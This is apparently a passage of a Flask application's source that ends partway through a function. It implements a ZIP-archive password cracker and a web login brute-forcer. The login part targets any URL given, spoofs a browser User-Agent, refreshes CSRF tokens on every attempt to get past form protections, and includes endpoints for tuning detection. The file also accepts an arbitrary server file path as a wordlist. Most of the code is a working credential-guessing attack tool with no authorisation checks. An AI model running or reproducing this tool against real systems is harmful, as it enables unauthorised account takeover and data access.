from flask import Flask, render_template, request, jsonify
import zipfile
try:
    import pyzipper
    HAS_PYZIPPER = True
except ImportError:
    HAS_PYZIPPER = False
import os
import itertools
import threading
import uuid
import socket
import platform
import subprocess
import re
from datetime import datetime

app = Flask(__name__, 
    template_folder='templates',
    static_folder='static'
)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
app.config['SECRET_KEY'] = os.urandom(32)

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('static', exist_ok=True)
os.makedirs('templates', exist_ok=True)

# ── Security headers on every response ──────────────────────────────────────
from flask import after_this_request

@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options']  = 'nosniff'
    response.headers['X-Frame-Options']         = 'SAMEORIGIN'
    response.headers['Referrer-Policy']         = 'strict-origin-when-cross-origin'
    response.headers['X-XSS-Protection']        = '1; mode=block'
    response.headers['Cache-Control']           = 'no-store, no-cache, must-revalidate'
    return response

# System wordlist paths — relative to project directory (works on Windows & Linux)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SYSTEM_WORDLISTS = {
    'rockyou':       os.path.join(BASE_DIR, 'wordlist', 'rockyou.txt'),
    'fasttrack':     os.path.join(BASE_DIR, 'wordlist', 'fasttrack.txt'),
    'dirb_common':   os.path.join(BASE_DIR, 'wordlist', 'common.txt'),
    'dirbuster_med': os.path.join(BASE_DIR, 'wordlist', 'directory-list-2.3-medium.txt'),
}

jobs = {}


def open_zip(path):
    if HAS_PYZIPPER:
        return pyzipper.AESZipFile(path, 'r')
    return zipfile.ZipFile(path, 'r')


def try_password(zf, filename, pw):
    try:
        zf.read(filename, pwd=pw.encode('utf-8'))
        return True
    except (RuntimeError, Exception):
        return False


# ── Dictionary attack ──────────────────────────────────────────────────────────
def crack_zip_dictionary(job_id, zip_path, wordlist_path, is_system_wl=False):
    job = jobs[job_id]
    job.update(status='running', found=False, password='', attempts=0, log=[], done=False)

    def log(msg): job['log'].append(msg)

    log(f"[*] Mode        : DICTIONARY ATTACK")
    log(f"[*] Target ZIP  : {os.path.basename(zip_path)}")
    log(f"[*] Wordlist    : {os.path.basename(wordlist_path)}")
    log(f"[*] Starting dictionary attack...")
    log("")

    try:
        with open_zip(zip_path) as zf:
            names = zf.namelist()
            if not names:
                log("[ERROR] ZIP file is empty.")
                job.update(status='error', done=True)
                return

            test_name = names[0]
            enc_type  = "AES-256 (pyzipper)" if HAS_PYZIPPER else "ZipCrypto"
            log(f"[*] Files in ZIP  : {len(names)}")
            log(f"[*] Testing with  : {test_name}")
            log(f"[*] Encryption    : {enc_type}")
            log("")

            try:
                with open(wordlist_path, 'r', errors='ignore') as wf:
                    for line in wf:
                        if job.get('cancelled'):
                            log("[!] Job cancelled by user.")
                            break
                        pw = line.strip()
                        if not pw:
                            continue
                        job['attempts'] += 1
                        if job['attempts'] % 50 == 0:
                            log(f"[*] Tried {job['attempts']} passwords...")
                        if try_password(zf, test_name, pw):
                            job.update(found=True, password=pw, status='found')
                            log("")
                            log("[+] PASSWORD FOUND!")
                            log(f"[+] Password  : {pw}")
                            log(f"[+] Attempts  : {job['attempts']}")
                            break
                    else:
                        if not job.get('cancelled'):
                            job['status'] = 'not_found'
                            log("")
                            log("[X] Password not found in wordlist.")
                            log(f"[i] Tried {job['attempts']} passwords total.")
                            log("[i] Tip: Try a larger wordlist or brute force mode.")

            except FileNotFoundError:
                log(f"[ERROR] Wordlist not found: {wordlist_path}")
                job['status'] = 'error'

    except Exception as e:
        log(f"[ERROR] Could not open ZIP: {str(e)}")
        job['status'] = 'error'

    job['done'] = True
    _cleanup(zip_path)
    if not is_system_wl:
        _cleanup(wordlist_path)


# ── Brute force attack ─────────────────────────────────────────────────────────
def crack_zip_bruteforce(job_id, zip_path, charset, min_len, max_len):
    job = jobs[job_id]
    job.update(status='running', found=False, password='', attempts=0, log=[], done=False)

    def log(msg): job['log'].append(msg)

    log(f"[*] Mode        : BRUTE FORCE ATTACK")
    log(f"[*] Target ZIP  : {os.path.basename(zip_path)}")
    log(f"[*] Charset     : {charset[:40]}{'...' if len(charset)>40 else ''}")
    log(f"[*] Charset size: {len(charset)} characters")
    log(f"[*] Length range: {min_len} – {max_len}")
    log(f"[*] Starting brute force...")
    log("")

    try:
        with open_zip(zip_path) as zf:
            names = zf.namelist()
            if not names:
                log("[ERROR] ZIP file is empty.")
                job.update(status='error', done=True)
                return

            test_name = names[0]
            enc_type  = "AES-256 (pyzipper)" if HAS_PYZIPPER else "ZipCrypto"
            log(f"[*] Files in ZIP  : {len(names)}")
            log(f"[*] Testing with  : {test_name}")
            log(f"[*] Encryption    : {enc_type}")
            log("")

            found = False
            for length in range(min_len, max_len + 1):
                if found or job.get('cancelled'):
                    break
                log(f"[*] Trying length {length}...")
                for combo in itertools.product(charset, repeat=length):
                    if job.get('cancelled'):
                        log("[!] Job cancelled by user.")
                        found = True  # break outer loop
                        break
                    pw = ''.join(combo)
                    job['attempts'] += 1
                    if job['attempts'] % 500 == 0:
                        log(f"[*] Tried {job['attempts']} combinations... (current: {pw})")
                    if try_password(zf, test_name, pw):
                        job.update(found=True, password=pw, status='found')
                        log("")
                        log("[+] PASSWORD FOUND!")
                        log(f"[+] Password  : {pw}")
                        log(f"[+] Attempts  : {job['attempts']}")
                        found = True
                        break

            if not job['found'] and not job.get('cancelled'):
                job['status'] = 'not_found'
                log("")
                log("[X] Password not found in specified keyspace.")
                log(f"[i] Tried {job['attempts']} combinations total.")
                log("[i] Tip: Increase max length or expand charset.")

    except Exception as e:
        log(f"[ERROR] Could not open ZIP: {str(e)}")
        job['status'] = 'error'

    job['done'] = True
    _cleanup(zip_path)


def _cleanup(*paths):
    for p in paths:
        try:
            if p and os.path.exists(p):
                os.remove(p)
        except Exception:
            pass


# ── Routes ─────────────────────────────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/crack', methods=['POST'])
def crack():
    if 'zipfile' not in request.files:
        return jsonify({'error': 'ZIP file is required.'}), 400

    zip_file = request.files['zipfile']
    if zip_file.filename == '':
        return jsonify({'error': 'No ZIP file selected.'}), 400

    mode     = request.form.get('mode', 'dictionary')
    job_id   = str(uuid.uuid4())[:8]
    zip_path = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_target.zip')
    zip_file.save(zip_path)

    jobs[job_id] = {
        'status': 'starting', 'found': False, 'password': '',
        'attempts': 0, 'log': [], 'done': False, 'cancelled': False
    }

    if mode == 'bruteforce':
        charset  = request.form.get('charset', 'abcdefghijklmnopqrstuvwxyz0123456789')
        min_len  = max(1, int(request.form.get('min_len', 1)))
        max_len  = min(12, int(request.form.get('max_len', 4)))
        t = threading.Thread(
            target=crack_zip_bruteforce,
            args=(job_id, zip_path, charset, min_len, max_len),
            daemon=True
        )
    else:
        # Dictionary mode
        wl_path = None
        sys_wl  = request.form.get('system_wordlist', '')

        if sys_wl:
            # System wordlist
            if sys_wl in SYSTEM_WORDLISTS:
                wl_path = SYSTEM_WORDLISTS[sys_wl]
            else:
                # Custom path passed from UI
                wl_path = sys_wl

            if not os.path.exists(wl_path):
                return jsonify({'error': f'System wordlist not found: {wl_path}'}), 400
        else:
            # Uploaded wordlist
            if 'wordlist' not in request.files or request.files['wordlist'].filename == '':
                return jsonify({'error': 'Wordlist file is required for dictionary attack.'}), 400
            wl_file = request.files['wordlist']
            wl_path = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_wordlist.txt')
            wl_file.save(wl_path)

        t = threading.Thread(
            target=crack_zip_dictionary,
            args=(job_id, zip_path, wl_path, bool(sys_wl)),
            daemon=True
        )

    t.start()
    return jsonify({'job_id': job_id})


@app.route('/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    job = jobs[job_id]
    return jsonify({
        'status':   job['status'],
        'found':    job['found'],
        'password': job['password'],
        'attempts': job['attempts'],
        'log':      job['log'],
        'done':     job['done']
    })


@app.route('/cancel/<job_id>', methods=['POST'])
def cancel(job_id):
    if job_id in jobs:
        jobs[job_id]['cancelled'] = True
    return jsonify({'ok': True})




@app.route('/api/device')
def device_info():
    try:
        hostname = socket.gethostname()
        try:
            local_ip = socket.gethostbyname(hostname)
        except Exception:
            local_ip = '—'

        # fallback for loopback
        if local_ip.startswith('127.'):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                local_ip = s.getsockname()[0]
                s.close()
            except Exception:
                pass

        username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME') or os.environ.get('USER') or '—'

        sys_info = {
            'username':    username,
            'device_name': hostname,
            'ip_address':  local_ip,
            'os':          f"{platform.system()} {platform.release()}",
            'os_version':  platform.version(),
            'architecture':platform.machine(),
            'processor':   platform.processor() or platform.machine(),
            'python':      platform.python_version(),
            'pyzipper':    HAS_PYZIPPER,
            'status':      'ONLINE',
            'uptime':      _get_uptime(),
            'timestamp':   datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        return jsonify(sys_info)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/network')
def network_info():
    try:
        hostname = socket.gethostname()
        try:
            local_ip = socket.gethostbyname(hostname)
        except Exception:
            local_ip = '—'
        if local_ip.startswith('127.'):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                local_ip = s.getsockname()[0]
                s.close()
            except Exception:
                pass

        gateway_ip, gateway_name = _get_gateway()

        try:
            socket.create_connection(('8.8.8.8', 53), timeout=2)
            net_status = 'CONNECTED'
        except OSError:
            net_status = 'DISCONNECTED'

        # DNS server
        dns = _get_dns()

        data = {
            'status':       net_status,
            'device_ip':    local_ip,
            'gateway_ip':   gateway_ip,
            'gateway_name': gateway_name,
            'dns':          dns,
            'hostname':     hostname,
            'fqdn':         socket.getfqdn(),
            'timestamp':    datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


def _get_uptime():
    try:
        if platform.system() == 'Windows':
            out = subprocess.check_output('net stats srv', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in out.splitlines():
                if 'since' in line.lower() or 'Statistics since' in line:
                    return line.strip()
            return '—'
        else:
            out = subprocess.check_output('uptime -p', shell=True, stderr=subprocess.DEVNULL).decode().strip()
            return out
    except Exception:
        return '—'


def _get_gateway():
    try:
        if platform.system() == 'Windows':
            out = subprocess.check_output('ipconfig', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in out.splitlines():
                if 'Default Gateway' in line:
                    ip = line.split(':')[-1].strip()
                    if ip and ip != '':
                        name = _reverse_dns(ip)
                        return ip, name
        else:
            out = subprocess.check_output('ip route show default', shell=True, stderr=subprocess.DEVNULL).decode()
            m = re.search(r'default via ([\d.]+)', out)
            if m:
                ip = m.group(1)
                name = _reverse_dns(ip)
                return ip, name
    except Exception:
        pass
    return '—', '—'


def _reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ip


def _get_dns():
    try:
        if platform.system() == 'Windows':
            out = subprocess.check_output('ipconfig /all', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            servers = []
            for line in out.splitlines():
                if 'DNS Servers' in line or (servers and line.startswith('   ')):
                    ip = line.split(':')[-1].strip()
                    if re.match(r'[0-9.]+', ip) and ip:
                        servers.append(ip)
                    if len(servers) >= 2:
                        break
            return ', '.join(servers) if servers else '—'
        else:
            with open('/etc/resolv.conf') as f:
                dns = [l.split()[1] for l in f if l.startswith('nameserver')]
                return ', '.join(dns[:2]) if dns else '—'
    except Exception:
        return '—'



# ══════════════════════════════════════════
# LOGIN PASSWORD CRACKER
# ══════════════════════════════════════════
import time
try:
    import requests as req_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

login_jobs = {}


def login_crack_worker(job_id, config):
    job = login_jobs[job_id]
    job.update(status='running', found=False, password='', attempts=0, log=[], done=False)

    url        = config['url']
    user_field = config['user_field']
    user_val   = config['user_val']
    pass_field = config['pass_field']
    fail_str   = config['fail_str'].strip()
    success_str= config.get('success_str', '').strip()
    method     = config['method'].upper()
    delay_ms   = int(config.get('delay_ms', 0))
    extra      = config.get('extra_fields', {})
    mode       = config['mode']

    def log(msg): job['log'].append(msg)

    log(f"[*] Mode         : {'DICTIONARY' if mode == 'dict' else 'BRUTE FORCE'}")
    log(f"[*] Target URL   : {url}")
    log(f"[*] HTTP Method  : {method}")
    log(f"[*] Username     : {user_val}")
    log(f"[*] User field   : {user_field}")
    log(f"[*] Pass field   : {pass_field}")
    log(f"[*] Fail string  : '{fail_str}'")
    if success_str:
        log(f"[*] Success str  : '{success_str}'")
    log(f"[*] Delay        : {delay_ms}ms")
    log("")

    if not HAS_REQUESTS:
        log("[ERROR] 'requests' library not installed.")
        log("[i] Run: pip install requests")
        job.update(status='error', done=True)
        return

    session = req_lib.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
    })

    # ── CSRF token auto-detection ──────────────────────────────────────────
    csrf_field  = config.get('csrf_field', '').strip()   # e.g. "_token"
    csrf_auto   = config.get('csrf_auto', False)         # auto-scan mode
    csrf_regex  = None

    def extract_token(html_text, field_name=None):
        """Extract CSRF token from HTML page using multiple strategies."""
        from html.parser import HTMLParser

        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tokens = {}
            def handle_starttag(self, tag, attrs):
                if tag == 'input':
                    d = dict(attrs)
                    n = d.get('name','').lower()
                    v = d.get('value','')
                    t = d.get('type','').lower()
                    # Named match
                    if field_name and d.get('name') == field_name:
                        self.tokens[d['name']] = v
                    # Auto-detect hidden fields that look like CSRF tokens
                    elif t == 'hidden' and v and len(v) > 8:
                        csrf_keywords = ['csrf','token','_token','nonce',
                                         'authenticity','verify','secret']
                        if any(kw in n for kw in csrf_keywords):
                            self.tokens[d.get('name','csrf')] = v
                    # meta tags
                elif tag == 'meta':
                    d = dict(attrs)
                    nm = d.get('name','').lower()
                    if 'csrf' in nm or 'token' in nm:
                        self.tokens[nm] = d.get('content','')

        p = FormParser()
        p.feed(html_text)
        return p.tokens

    # Do a baseline request — load page, detect tokens, validate fail string
    found_csrf_fields = {}
    try:
        baseline = session.get(url, timeout=8)
        log(f"[*] Baseline HTTP {baseline.status_code} — {len(baseline.text)} bytes")
        log(f"[*] Final URL     : {baseline.url}")

        # Auto-detect CSRF tokens
        tokens = extract_token(baseline.text, csrf_field if csrf_field else None)
        if tokens:
            found_csrf_fields = tokens
            for k, v in tokens.items():
                log(f"[*] CSRF detected  : {k} = {v[:24]}{'...' if len(v)>24 else ''}")
        elif csrf_field:
            log(f"[!] CSRF field '{csrf_field}' not found in page — check field name")
        else:
            log(f"[*] No CSRF tokens detected (or not needed)")

        # Sanity check fail string
        if fail_str and fail_str.lower() not in baseline.text.lower():
            log(f"[!] WARNING: Fail string '{fail_str}' NOT found in login page!")
            log(f"[!] Showing first 300 chars of response body:")
            preview = baseline.text[:300].replace(chr(10),' ').replace(chr(13),'')
            log(f"[i] {preview}")
        else:
            if fail_str:
                log(f"[*] Fail string confirmed in login page")
        log("")
    except Exception as e:
        log(f"[!] Baseline request failed: {e}")
        log("")

    def fetch_fresh_token():
        """GET the login page fresh and extract a new CSRF token."""
        try:
            r = session.get(url, timeout=8)
            tokens = extract_token(r.text, csrf_field if csrf_field else None)
            return tokens
        except Exception:
            return {}

    def try_login(password, debug=False):
        data = dict(extra)
        data[user_field] = user_val
        data[pass_field] = password

        # Inject fresh CSRF token on every attempt
        if found_csrf_fields or csrf_field:
            fresh = fetch_fresh_token()
            if fresh:
                data.update(fresh)
            elif found_csrf_fields:
                data.update(found_csrf_fields)

        try:
            if method == 'POST':
                r = session.post(url, data=data, timeout=10, allow_redirects=True)
            else:
                r = session.get(url, params=data, timeout=10, allow_redirects=True)

            body_lower  = r.text.lower()
            redirected  = r.url.rstrip('/') != url.rstrip('/')
            status      = r.status_code

            if debug:
                return {
                    'status_code':  status,
                    'final_url':    r.url,
                    'body_length':  len(r.text),
                    'body_preview': r.text[:800],
                    'redirected':   redirected,
                    'sent_fields':  list(data.keys()),
                    'fail_str_present': fail_str.lower() in body_lower if fail_str else None,
                    'success_str_present': success_str.lower() in body_lower if success_str else None,
                }

            # ── Detection logic ──────────────────────────────────────────
            # Priority 1: success string given → must be present
            if success_str:
                # Success string given — must be present in response
                found = success_str.lower() in body_lower
            elif fail_str:
                # Fail string given — success = fail string is ABSENT
                # This is the most reliable method for HTTP form login
                fail_present = fail_str.lower() in body_lower
                found = not fail_present
            else:
                # No strings at all — use URL redirect as signal
                found = redirected

            return found, status, r.url, len(r.text)
        except Exception as e:
            return None, str(e), '', 0

    def run_passwords(password_iter):
        for pw in password_iter:
            if job.get('cancelled'):
                log("[!] Cancelled by user.")
                return False

            pw = pw.strip()
            if not pw:
                continue

            job['attempts'] += 1
            count = job['attempts']

            if count % 20 == 0:
                log(f"[*] Tried {count} passwords... (current: {pw})")

            result, code, final_url, body_len = try_login(pw)

            if result is None:
                log(f"[X] Request error on attempt {count}: {code}")
                continue

            # First 3 attempts — verbose diagnostic
            if count <= 3:
                redir = final_url.rstrip('/') != url.rstrip('/')
                log(f"[~] #{count} '{pw}' → HTTP {code} | "
                    f"redirected={'YES' if redir else 'NO'} | "
                    f"found={result}")

            if result:
                job.update(found=True, password=pw, status='found',
                           username=user_val, target=url)
                log("")
                log(f"[+] PASSWORD FOUND!")
                log(f"[+] Password   : {pw}")
                log(f"[+] Username   : {user_val}")
                log(f"[+] Attempts   : {count}")
                log(f"[+] HTTP Code  : {code}")
                log(f"[+] Final URL  : {final_url}")
                return True

            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)

        return False

    found = False
    if mode == 'dict':
        wl_path = config['wordlist_path']
        log(f"[*] Wordlist     : {os.path.basename(wl_path)}")
        log("")
        try:
            with open(wl_path, 'r', errors='ignore') as wf:
                found = run_passwords(wf)
        except FileNotFoundError:
            log(f"[ERROR] Wordlist not found: {wl_path}")
            job['status'] = 'error'
    else:
        import itertools as _it
        charset = config['charset']
        min_len = config['min_len']
        max_len = config['max_len']
        log(f"[*] Charset      : {charset[:40]}{'...' if len(charset) > 40 else ''}")
        log(f"[*] Length range : {min_len}–{max_len}")
        log("")
        for length in range(min_len, max_len + 1):
            if found or job.get('cancelled'):
                break
            log(f"[*] Trying length {length}...")
            found = run_passwords(''.join(c) for c in _it.product(charset, repeat=length))

    if not found and not job.get('cancelled') and job['status'] != 'error':
        job['status'] = 'not_found'
        log("")
        log(f"[X] Password not found.")
        log(f"[i] Tried {job['attempts']} passwords total.")
        log(f"[i] Tips:")
        log(f"[i]  1. Open the login page, try a WRONG password manually,")
        log(f"[i]     copy the exact error text and paste it as Fail String.")
        log(f"[i]  2. Enable browser DevTools → Network, check what form")
        log(f"[i]     fields are actually submitted (field names matter).")
        if success_str == '':
            log(f"[i]  3. Try adding a Success String instead of relying on")
            log(f"[i]     Fail String absence (more reliable).")

    # Cleanup uploaded wordlist
    if config.get('cleanup_wl') and config.get('wordlist_path'):
        try:
            os.remove(config['wordlist_path'])
        except Exception:
            pass

    job['done'] = True

@app.route('/api/probe', methods=['POST'])
def probe_url():
    """Quick reachability check for the target URL."""
    data = request.get_json(force=True)
    url  = data.get('url', '').strip()
    if not url:
        return jsonify({'reachable': False, 'error': 'No URL provided'})
    if not HAS_REQUESTS:
        return jsonify({'reachable': False, 'error': 'requests library not installed'})
    try:
        import time as _t
        start = _t.time()
        r = req_lib.get(url, timeout=8, allow_redirects=True,
                        headers={'User-Agent': 'Mozilla/5.0'})
        ms = int((_t.time() - start) * 1000)
        server = r.headers.get('Server', '') or r.headers.get('X-Powered-By', '')
        return jsonify({
            'reachable': True,
            'status_code': r.status_code,
            'server': server,
            'response_time_ms': ms,
        })
    except Exception as e:
        return jsonify({'reachable': False, 'error': str(e)})


@app.route('/login_crack', methods=['POST'])
def login_crack():
    url        = request.form.get('url', '').strip()
    user_field = request.form.get('user_field', 'username')
    user_val   = request.form.get('user_val', '')
    pass_field = request.form.get('pass_field', 'password')
    fail_str    = request.form.get('fail_str', 'Invalid')
    success_str = request.form.get('success_str', '')
    method     = request.form.get('method', 'POST')
    delay_ms   = request.form.get('delay_ms', 100)
    mode       = request.form.get('mode', 'dict')
    extra_raw  = request.form.get('extra_fields', '{}')

    if not url:
        return jsonify({'error': 'URL is required'}), 400
    if not user_val:
        return jsonify({'error': 'Username/email is required'}), 400

    try:
        import json as _json
        extra_fields = _json.loads(extra_raw)
    except Exception:
        extra_fields = {}

    job_id = str(uuid.uuid4())[:8]
    config = {
        'url': url, 'user_field': user_field, 'user_val': user_val,
        'pass_field': pass_field, 'fail_str': fail_str, 'success_str': success_str,
        'csrf_field': request.form.get('csrf_field', ''), 'method': method,
        'delay_ms': delay_ms, 'extra_fields': extra_fields, 'mode': mode,
    }

    if mode == 'dict':
        sys_wl = request.form.get('system_wordlist', '')
        if sys_wl:
            wl_path = SYSTEM_WORDLISTS.get(sys_wl, sys_wl)
            if not os.path.exists(wl_path):
                return jsonify({'error': f'Wordlist not found: {wl_path}'}), 400
            config['wordlist_path'] = wl_path
            config['cleanup_wl']   = False
        else:
            if 'wordlist' not in request.files or request.files['wordlist'].filename == '':
                return jsonify({'error': 'Wordlist required for dictionary mode'}), 400
            wl_file = request.files['wordlist']
            wl_path = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_lc_wl.txt')
            wl_file.save(wl_path)
            config['wordlist_path'] = wl_path
            config['cleanup_wl']   = True
    else:
        config['charset']  = request.form.get('charset', 'abcdefghijklmnopqrstuvwxyz0123456789')
        config['min_len']  = max(1, int(request.form.get('min_len', 1)))
        config['max_len']  = min(8,  int(request.form.get('max_len', 4)))

    login_jobs[job_id] = {
        'status': 'starting', 'found': False, 'password': '',
        'username': user_val, 'target': url,
        'attempts': 0, 'log': [], 'done': False, 'cancelled': False
    }

    t = threading.Thread(target=login_crack_worker, args=(job_id, config), daemon=True)
    t.start()
    return jsonify({'job_id': job_id})


@app.route('/login_status/<job_id>')
def login_status(job_id):
    if job_id not in login_jobs:
        return jsonify({'error': 'Job not found'}), 404
    job = login_jobs[job_id]
    return jsonify({
        'status':   job['status'],
        'found':    job['found'],
        'password': job['password'],
        'username': job.get('username', ''),
        'target':   job.get('target', ''),
        'attempts': job['attempts'],
        'log':      job['log'],
        'done':     job['done'],
    })


@app.route('/login_cancel/<job_id>', methods=['POST'])
def login_cancel(job_id):
    if job_id in login_jobs:
        login_jobs[job_id]['cancelled'] = True
    return jsonify({'ok': True})




@app.route('/api/debug_login', methods=['POST'])
def debug_login():
    """
    Fire a SINGLE test attempt and return the full server response
    so the user can see exactly what the page looks like after login.
    """
    if not HAS_REQUESTS:
        return jsonify({'error': 'requests library not installed'})

    data_in    = request.get_json(force=True)
    url        = data_in.get('url','').strip()
    user_field = data_in.get('user_field','username')
    user_val   = data_in.get('user_val','')
    pass_field = data_in.get('pass_field','password')
    test_pw    = data_in.get('test_password','test123')
    method     = data_in.get('method','POST').upper()
    csrf_field = data_in.get('csrf_field','').strip()
    extra      = data_in.get('extra_fields', {})

    if not url:
        return jsonify({'error': 'URL required'})

    from html.parser import HTMLParser

    class TokenParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.tokens = {}
        def handle_starttag(self, tag, attrs):
            d = dict(attrs)
            if tag == 'input':
                name  = d.get('name','')
                value = d.get('value','')
                itype = d.get('type','').lower()
                csrf_kw = ['csrf','token','_token','nonce','authenticity','verify','xsrf']
                if itype == 'hidden' and value and len(value) > 6:
                    if any(kw in name.lower() for kw in csrf_kw) or len(value) > 20:
                        self.tokens[name] = value

    try:
        session = req_lib.Session()
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'

        # 1. GET login page
        page = session.get(url, timeout=8)
        parser = TokenParser()
        parser.feed(page.text)

        # 2. Build POST data
        post_data = dict(extra)
        post_data[user_field] = user_val
        post_data[pass_field] = test_pw
        if parser.tokens:
            post_data.update(parser.tokens)

        # 3. Submit
        if method == 'POST':
            r = session.post(url, data=post_data, timeout=10, allow_redirects=True)
        else:
            r = session.get(url, params=post_data, timeout=10, allow_redirects=True)

        # 4. Extract all visible text from response
        class TextExtractor(HTMLParser):
            def __init__(self):
                super().__init__()
                self.texts = []
                self._skip = False
            def handle_starttag(self, tag, attrs):
                if tag in ('script','style','head'): self._skip = True
            def handle_endtag(self, tag):
                if tag in ('script','style','head'): self._skip = False
            def handle_data(self, data):
                t = data.strip()
                if t and not self._skip: self.texts.append(t)

        extractor = TextExtractor()
        extractor.feed(r.text)
        visible_text = ' | '.join(extractor.texts[:40])

        return jsonify({
            'sent_url':       url,
            'sent_fields':    post_data,
            'csrf_found':     parser.tokens,
            'response_code':  r.status_code,
            'final_url':      r.url,
            'redirected':     r.url.rstrip('/') != url.rstrip('/'),
            'body_length':    len(r.text),
            'visible_text':   visible_text[:600],
            'body_preview':   r.text[:600],
        })
    except Exception as e:
        return jsonify({'error': str(e)})


@app.route('/api/manual_test', methods=['POST'])
def manual_test():
    """Try ONE specific password and return the raw server response."""
    if not HAS_REQUESTS:
        return jsonify({'error': 'requests library not installed'})

    d          = request.get_json(force=True)
    url        = d.get('url', '').strip()
    user_field = d.get('user_field', 'username')
    user_val   = d.get('user_val', '')
    pass_field = d.get('pass_field', 'password')
    password   = d.get('password', '')
    method     = d.get('method', 'POST').upper()
    extra      = d.get('extra_fields', {})
    fail_str   = d.get('fail_str', '')
    success_str= d.get('success_str', '')

    if not url or not password:
        return jsonify({'error': 'url and password required'})

    try:
        from html.parser import HTMLParser

        class TokenParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tokens = {}
                self.all_inputs = []
            def handle_starttag(self, tag, attrs):
                d = dict(attrs)
                if tag == 'input':
                    self.all_inputs.append({
                        'name':  d.get('name',''),
                        'type':  d.get('type',''),
                        'value': d.get('value','')[:40],
                    })
                    itype = d.get('type','').lower()
                    name  = d.get('name','')
                    value = d.get('value','')
                    csrf_kw = ['csrf','token','_token','nonce','authenticity','verify','xsrf']
                    if itype == 'hidden' and value and len(value) > 6:
                        if any(kw in name.lower() for kw in csrf_kw) or len(value) > 20:
                            self.tokens[name] = value

        session = req_lib.Session()
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'

        # GET the login page first
        page_r = session.get(url, timeout=8)
        parser = TokenParser()
        parser.feed(page_r.text)

        # Build POST data
        post_data = dict(extra)
        post_data[user_field] = user_val
        post_data[pass_field] = password
        if parser.tokens:
            post_data.update(parser.tokens)

        # Submit
        if method == 'POST':
            r = session.post(url, data=post_data, timeout=10, allow_redirects=True)
        else:
            r = session.get(url, params=post_data, timeout=10, allow_redirects=True)

        body = r.text

        # Check fail/success strings
        fail_found    = fail_str.lower()    in body.lower() if fail_str    else None
        success_found = success_str.lower() in body.lower() if success_str else None

        # Extract all visible text
        class TextExtractor(HTMLParser):
            def __init__(self):
                super().__init__()
                self.texts = []
                self._skip = False
            def handle_starttag(self, tag, attrs):
                if tag in ('script','style'): self._skip = True
            def handle_endtag(self, tag):
                if tag in ('script','style'): self._skip = False
            def handle_data(self, data):
                t = data.strip()
                if t and not self._skip:
                    self.texts.append(t)

        te = TextExtractor()
        te.feed(body)
        visible = ' | '.join(te.texts[:60])

        return jsonify({
            'password_tested':   password,
            'sent_data':         post_data,
            'all_form_inputs':   parser.all_inputs,
            'csrf_injected':     parser.tokens,
            'response_code':     r.status_code,
            'final_url':         r.url,
            'redirected':        r.url.rstrip('/') != url.rstrip('/'),
            'body_length':       len(body),
            'fail_str':          fail_str,
            'fail_str_found':    fail_found,
            'success_str':       success_str,
            'success_str_found': success_found,
            'visible_text':      visible[:1000],
            'raw_body_start':    body[:500],
            'raw_body_end':      body[-300:],
            'verdict':           'WOULD_SUCCEED' if (
                (success_str and success_found) or
                (not success_str and fail_str and not fail_found) or
                (not success_str and not fail_str and r.url.rstrip('/') != url.rstrip('/'))
            ) else 'WOULD_FAIL',
        })
    except Exception as e:
        import traceback
        return jsonify({'error': str(e), 'trace': traceback.format_exc()})

@app.route('/api/scan_csrf', methods=['POST'])
def scan_csrf():
    """Fetch the login page and extract all CSRF-like hidden fields."""
    data = request.get_json(force=True)
    url  = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'No URL provided'})
    if not HAS_REQUESTS:
        return jsonify({'error': 'requests library not installed'})
    try:
        from html.parser import HTMLParser

        class TokenParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tokens = {}
            def handle_starttag(self, tag, attrs):
                d = dict(attrs)
                if tag == 'input':
                    name  = d.get('name', '')
                    value = d.get('value', '')
                    itype = d.get('type', '').lower()
                    csrf_kw = ['csrf', 'token', '_token', 'nonce',
                               'authenticity', 'verify', 'secret', 'xsrf']
                    if itype == 'hidden' and value and len(value) > 6:
                        if any(kw in name.lower() for kw in csrf_kw):
                            self.tokens[name] = value
                    # also catch any hidden input with long random-looking value
                    elif itype == 'hidden' and value and len(value) > 20:
                        self.tokens[name] = value
                elif tag == 'meta':
                    name    = d.get('name', '').lower()
                    content = d.get('content', '')
                    if ('csrf' in name or 'token' in name) and content:
                        self.tokens[name] = content

        s = req_lib.Session()
        s.headers['User-Agent'] = 'Mozilla/5.0'
        r = s.get(url, timeout=8)
        parser = TokenParser()
        parser.feed(r.text)
